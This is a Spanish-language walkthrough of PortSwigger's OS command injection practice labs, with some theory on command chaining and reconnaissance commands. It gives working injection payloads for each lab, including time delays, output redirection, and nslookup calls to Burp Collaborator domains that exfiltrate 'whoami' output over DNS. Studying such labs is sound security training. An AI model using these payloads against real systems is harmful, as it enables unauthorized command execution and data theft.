---
title: Command Injection | PortSwigger
---
Labs de Command Injection de PortSwigger hechos y explicados. Tambien incluyo un poco de teoria.

### Parte teórica

comandos útiles:

```
Purpose of command      Linux              Windows
Name of current user     whoami             whoami
Operating system         uname -a         ver
Network configuration     ifconfig         ipconfig /all
Network connections     netstat -an     netstat -an
Running processes         ps -ef             tasklist
```

Concatenar comandos:

```
#Windows & Sistemas basados en Unix: 
&
&&
|
||
#Solo en sistemas basados en Unix: 
;
Newline (0x0a or \n)
# Para inyectar comandos:
`comando`
$(comando)
```

-   Detectar OS C.I usando time delays:

```
& ping -c 10 127.0.0.1 &
# Este comando hará que la aplicación haga ping a su adaptador de red loopback durante 10 segundos.
```
----------
### Parte práctica

#### Lab: OS command injection, simple case

```
# Simplemente tenmos que añadir | whoami despues de productId ya que no filtra el input del usuario.
```

#### Lab: Blind OS command injection with time delays

```
||ping+-c+10+127.0.0.1||
# Lo agregamos despues del campo email para concatenarlo y causar un delay de 10s
```

#### Lab: Blind OS command injection with output redirection

```
# Campo email explotable:
||whoami+>+/var/www/images/test.txt||
# usamos /var/www/images/ ya que sabemos que es vulnerable
# Una vez concatenamos y enviamos ese comando, vamos a la pagina, entramos en cualquier producto, interceptamos la petición y cuando veamos:
GET /image?filename=26.jpg # En la request, cambiamos 26.jpg por el archivo .txt (test.txt en mi caso)
```
--------
#### Lab: Blind OS command injection with out-of-band interaction

```
||nslookup+5tzgk7i5ksx0e2hgdyiii4mreik88x.oastify.com||
#Concatenamos nuestro dominio del burp collaborator al campo email del feedback.
#También podemos ejecutar comandos y que su resultado sea redirigido a nuestro dominio. Por ejemplo:
& nslookup `whoami`."dominio.." &
```
----------
#### Lab: Blind OS command injection with out-of-band data exfiltration
```
# Concatenamos lo siguiente al campo email: 
||nslookup+`whoami`.3koeb593bqoy508e4w9g92dp5gbcz1.oastify.com||
```